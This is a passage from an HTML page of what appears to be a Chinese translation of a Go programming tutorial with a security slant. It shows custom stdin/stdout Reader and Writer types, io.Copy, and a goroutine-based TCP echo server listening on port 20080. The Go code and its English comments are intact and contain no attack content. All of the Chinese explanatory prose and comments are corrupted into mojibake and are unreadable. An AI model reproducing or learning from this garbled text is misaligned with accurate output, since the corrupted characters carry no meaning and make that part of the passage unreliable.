</span></span></code></pre></div><p>å‚ç…§ä¸Šè¿°ç¤ºä¾‹ï¼Œå¯ä»¥è‡ªå®šä¹‰åŒ…è£…äº† stdin å’Œ stdout çš„ Reader å’Œ Writer ã€‚è‡ªä» Go çš„ os.Stdin å’Œ os.Stdout ç±»å‹å……å½“ Reader å’Œ Writer ä»¥æ¥ï¼Œå¾ˆå¤šäººç¼–å†™è¿‡ä¸æ­¤ç›¸å…³çš„ä»£ç ï¼Œä½†å¦‚æœä½ ä¸æ—¶å¸¸é‡æ–°é€ è½®å­ï¼Œé‚£ä¹ˆå°±å¯èƒ½å­¦ä¸åˆ°ä»»ä½•ä¸œè¥¿ã€‚</p>
<p>ç»“æ„ä½“ç±»å‹ FooWriter å’Œ FooReader çš„å®Œæ•´å®ç°:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// FooReader å®šä¹‰äº†ä¸€ä¸ªä»æ ‡å‡†è¾“å…¥ (stdin) è¯»å–çš„ io.Reader.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FooReader</span> <span style="color:#66d9ef">struct</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Read ä»æ ‡å‡†è¾“å…¥ (stdin) è¯»å–æ•°æ®
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">FooReader</span>) <span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">b</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">&#34;in &gt; &#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stdin</span>.<span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">b</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// FooWriter å®šä¹‰äº†ä¸€ä¸ªå†™å…¥æ ‡å‡†è¾“å‡º (stdout) çš„ io.Writer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FooWriter</span> <span style="color:#66d9ef">struct</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Write å°†æ•°æ®å†™å…¥æ ‡å‡†è¾“å‡º (stdout)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">FooWriter</span>) <span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">&#34;out&gt; &#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stdout</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// å®ä¾‹åŒ– reader å’Œ writer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">reader</span> <span style="color:#a6e22e">FooReader</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">writer</span> <span style="color:#a6e22e">FooWriter</span>
</span></span><span style="display:flex;"><span>	)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// åˆ›å»ºç¼“å†²åŒºä»¥ä¿å­˜è¾“å…¥/è¾“å‡º
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">input</span> <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">4096</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ä½¿ç”¨ reader è¯»å–è¾“å…¥
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">input</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to read data&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Read %d bytes from stdin\n&#34;</span>, <span style="color:#a6e22e">s</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ä½¿ç”¨ writer å†™å…¥è¾“å‡º
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">writer</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">input</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to write data&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Wrote %d bytes to stdout\n&#34;</span>, <span style="color:#a6e22e">s</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>å°†æ•°æ®ä» Reader å¤åˆ¶åˆ° Writer æ˜¯ä¸€ç§éå¸¸å¸¸è§çš„æ¨¡å¼ï¼Œè¿™ä¿ƒä½¿ Go çš„ io åŒ…ä¸­æä¾›ä¸€ä¸ªå‡½æ•° Copy() ,è¯¥å‡½æ•°å¯ç”¨äºç®€åŒ–å‡½æ•° main() ã€‚å‡½æ•°Copy()åŸå‹å¦‚ä¸‹ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">dst</span> <span style="color:#a6e22e">Writer</span>, <span style="color:#a6e22e">src</span> <span style="color:#a6e22e">Reader</span>) (<span style="color:#a6e22e">written</span> <span style="color:#66d9ef">int64</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>)
</span></span></code></pre></div><p>ä½¿ç”¨è¿™ä¸ªå‡½æ•° Copy() å¯ä»¥å®ç°ä¸ä»¥å‰ç›¸åŒçš„æ•ˆæœ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// FooReader defines an io.Reader to read from stdin.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FooReader</span> <span style="color:#66d9ef">struct</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Read reads data from stdin.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">fooReader</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">FooReader</span>) <span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">b</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">&#34;in &gt; &#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stdin</span>.<span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">b</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// FooWriter defines an io.Writer to write to Stdout.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FooWriter</span> <span style="color:#66d9ef">struct</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Write writes data to Stdout.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">fooWriter</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">FooWriter</span>) <span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">&#34;out&gt; &#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stdout</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Instantiate reader and writer.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">reader</span> <span style="color:#a6e22e">FooReader</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">writer</span> <span style="color:#a6e22e">FooWriter</span>
</span></span><span style="display:flex;"><span>	)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">writer</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">reader</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to read/write data&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>æ³¨æ„ï¼Œå¯¹ reader.Read([]byte) å’Œ writer.Write([]byte) çš„æ˜¾å¼è°ƒç”¨å·²æ›¿æ¢ä¸ºå¯¹ io.Copy(writer,,reader) çš„å•ä¸ªè°ƒç”¨ã€‚èƒŒåçš„æœºåˆ¶æ˜¯ io.Copy(writer,reader) è°ƒç”¨æä¾›çš„ reader ä¸Šçš„å‡½æ•° Read([]byte) ,è§¦å‘ FooReader ä» stdin è¯»å–ã€‚éšåï¼Œ io.Copy(writer,reader) åœ¨ writer ä¸Šè°ƒç”¨å‡½æ•° Wite([]byte) ,ä»è€Œå¼•èµ·å¯¹ FooWriter çš„è°ƒç”¨ï¼Œè€Œ FooWriter åˆ™å°†æ•°æ®å†™å…¥ stdout ã€‚å®é™…ä¸Šï¼Œio.Copy(writer,reader) æŒ‰é¡ºåºå¤„ç†å…ˆè¯»åå†™çš„è¿‡ç¨‹ï¼Œè€Œæ— é¡»å¤„ç†å„ç§çç¢çš„ç»†èŠ‚ã€‚</p>
<p>æœ¬éƒ¨åˆ†å†…å®¹ç»ä¸æ˜¯å¯¹ Go çš„ I/O å’Œæ¥å£çš„å…¨é¢ä»‹ç»ã€‚è®¸å¤šä¾¿æ·å‡½æ•°ä»¥åŠè‡ªå®šä¹‰çš„ Reader å’Œ Writer åªæ˜¯ Go æ ‡å‡†åŒ…çš„å…¶ä¸­ä¸€ä¸ªç»„æˆéƒ¨åˆ†ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒGoçš„æ ‡å‡†åŒ…éƒ½åŒ…å«æ‰€æœ‰ç”¨äºå®Œæˆæœ€å¸¸è§ä»»åŠ¡çš„åŸºæœ¬å®ç°ã€‚åœ¨ä¸‹ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æ¢è®¨å¦‚ä½•å°†è¿™äº›åŸºç¡€çŸ¥è¯†åº”ç”¨åˆ°TCPé€šä¿¡ä¸­ï¼Œä»¥ä½¿ä½ èƒ½å¼€å‘ä¸€äº›å®ç”¨å·¥å…·ã€‚</p>
<h3 id="22-åˆ›å»ºå›æ˜¾æœåŠ¡å™¨">2.2 åˆ›å»ºå›æ˜¾æœåŠ¡å™¨<a hidden class="anchor" aria-hidden="true" href="#22-åˆ›å»ºå›æ˜¾æœåŠ¡å™¨">#</a></h3>
<p>æŒ‰ç…§å¤§å¤šæ•°è¯­è¨€çš„ä¹ æƒ¯ï¼Œé¦–å…ˆéœ€è¦æ„å»ºä¸€ä¸ªå›æ˜¾æœåŠ¡å™¨ï¼Œä»¥å­¦ä¹ å¦‚ä½•åœ¨å¥—æ¥å­—ä¸­è¯»å†™æ•°æ®ã€‚ä¸ºæ­¤ï¼Œéœ€è¦ç”¨åˆ° net.Conn ( Go çš„é¢å‘æµçš„ç½‘ç»œè¿æ¥)ï¼Œæˆ‘ä»¬åœ¨æ„å»ºç«¯å£æ‰«æå™¨æ—¶å¯¹æ­¤æœ‰è¿‡ä»‹ç»ã€‚ç”± Go çš„æ–‡æ¡£å¯çŸ¥ï¼ŒConn å®ç°äº†é’ˆå¯¹æ¥å£ Reader å’Œ Writer å®šä¹‰çš„å‡½æ•° Read([]byte) å’Œ Write([]byte) ã€‚å› æ­¤ï¼ŒConnå¯ä»¥æ—¢æ˜¯ Reader åˆæ˜¯ Writer ã€‚ä»é€»è¾‘ä¸Šè®²è¿™æ˜¯åˆç†çš„ï¼Œå› ä¸º TCP è¿æ¥æ˜¯åŒå‘çš„ï¼Œå¯ä»¥ç”¨æ¥å‘é€ï¼ˆå†™å…¥ï¼‰æˆ–æ¥æ”¶ï¼ˆè¯»å–ï¼‰æ•°æ®ã€‚</p>
<p>åˆ›å»º Conn å®ä¾‹åï¼Œå¯ä»¥é€šè¿‡ TCP å¥—æ¥å­—å‘é€å’Œæ¥æ”¶æ•°æ®ã€‚ä¸è¿‡ï¼ŒTCPæœåŠ¡å™¨ä¸èƒ½ç®€å•åœ°åˆ›å»ºä¸€ä¸ªè¿æ¥ï¼Œè¿æ¥å¿…é¡»ç”±å®¢æˆ·ç«¯å‘èµ·å»ºç«‹ã€‚åœ¨ Go ä¸­ï¼Œé¦–å…ˆå¯ä»¥ä½¿ç”¨
net.Listen(network,address string) åœ¨ç‰¹å®šç«¯å£ä¸Šæ‰“å¼€ TCP ç›‘å¬å™¨ã€‚å®¢æˆ·ç«¯è¿æ¥åï¼Œæ–¹æ³• Accept() å°†åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ª Conn å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨è¯¥å¯¹è±¡æ¥æ”¶å’Œå‘é€æ•°æ®ã€‚</p>
<p>å®ç°å›æ˜¾æœåŠ¡å™¨çš„å®Œæ•´ç¤ºä¾‹:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// echo is a handler function that simply echoes received data.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// echo æ˜¯ä¸€ä¸ªå¤„ç†ï¼ˆhandlerï¼‰å‡½æ•°,å®ƒä»…å›æ˜¾æ¥æ”¶åˆ°çš„æ•°æ®
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">echo</span>(<span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Create a buffer to store received data.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// åˆ›å»ºä¸€ä¸ªç¼“å†²åŒºæ¥å­˜å‚¨æ¥æ”¶åˆ°çš„æ•°æ®
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">b</span> <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">512</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Receive data via conn.Read into a buffer.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">// é€šè¿‡ conn.Read æ¥æ”¶æ•°æ®åˆ°ä¸€ä¸ªç¼“å†²åŒº
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">size</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">0</span>:])
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">EOF</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Unexpected error&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">EOF</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">size</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Client disconnected&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Received %d bytes: %s&#34;</span>, <span style="color:#a6e22e">size</span>, string(<span style="color:#a6e22e">b</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Send data via conn.Write.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">// é€šè¿‡ conn.Write å‘é€æ•°æ®
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Writing data&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">0</span>:<span style="color:#a6e22e">size</span>]); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to write data&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Bind to TCP port 20080 on all interfaces.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// åœ¨æ‰€æœ‰æ¥å£ä¸Šç»‘å®š Tcp ç«¯å£ 20080
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">listener</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Listen</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#e6db74">&#34;:20080&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to bind to port&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Listening on 0.0.0.0:20080&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Wait for connection. Create net.Conn on connection established.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">// ç­‰å¾…è¿æ¥ã€‚åœ¨å·²å»ºç«‹çš„è¿æ¥ä¸Šåˆ›å»º net.conn
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">listener</span>.<span style="color:#a6e22e">Accept</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Received connection&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to accept connection&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Handle the connection. Using goroutine for concurrency.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">// å¤„ç†è¿æ¥ã€‚ä½¿ç”¨ goroutine å®ç°å¹¶å‘
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">echo</span>(<span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªåä¸º echo(net.Conn) çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°æ¥æ”¶ Conn å®ä¾‹ä½œä¸ºå‚æ•°ã€‚å®ƒå……å½“æ‰§è¡Œæ‰€æœ‰å¿…è¦çš„ I/O è¿æ¥çš„å¤„ç†ç¨‹åºã€‚è¯¥å‡½æ•°ä½¿ç”¨ç¼“å†²ä»è¿æ¥è¯»å–æ•°æ®ä»¥åŠå‘è¿æ¥å†™å…¥æ•°æ®ï¼Œè¿›è¡Œæ— é™å¾ªç¯ã€‚æ•°æ®ä¼šè¢«è¯»å…¥ä¸€ä¸ªåä¸º b çš„å˜é‡ä¸­ï¼Œå†å†™å›è¯¥è¿æ¥ã€‚</p>
<p>ç°åœ¨ï¼Œéœ€è¦è®¾ç½®ä¸€ä¸ªç›‘å¬å™¨ï¼Œè¯¥ç›‘å¬å™¨å°†è°ƒç”¨å¤„ç†ç¨‹åºã€‚å¦‚å‰æ‰€è¿°ï¼ŒæœåŠ¡å™¨æ— æ³•å»ºç«‹è¿æ¥ï¼Œä¸”å¿…é¡»ç›‘å¬æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ã€‚å› æ­¤ï¼Œä½¿ç”¨ net.Listen(network,address string) å‡½æ•°åœ¨æ‰€æœ‰æ¥å£ä¸Šå¯ç”¨å®šä¹‰ä¸ºç»‘å®šåˆ° TCP ç«¯å£ 20080 çš„ç›‘å¬å™¨ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæ— é™å¾ªç¯ç¡®ä¿å³ä½¿å·±ç»æ”¶åˆ°ä¸€ä¸ªè¿æ¥ï¼ŒæœåŠ¡å™¨ä»å°†ç»§ç»­ç›‘å¬æ–°çš„è¿æ¥è¯·æ±‚ã€‚åœ¨æ­¤å¾ªç¯ä¸­ï¼Œè°ƒç”¨ listener.Accept() æ¥å—å®¢æˆ·ç«¯çš„è¿æ¥ã€‚å½“å®¢æˆ·ç«¯è¿æ¥æˆåŠŸæ—¶ï¼Œæ­¤å‡½æ•°è¿”å›ä¸€ä¸ª Conn å®ä¾‹ã€‚å›æƒ³æœ¬èŠ‚å‰é¢æ‰€è¿°çš„å†…å®¹ï¼Œå³ Conn æ—¢æ˜¯ Reader ä¹Ÿæ˜¯ Writer ,å®ƒå®ç°äº† Read([]byte) å’Œ Write([]byte)æ–¹æ³•ã€‚</p>
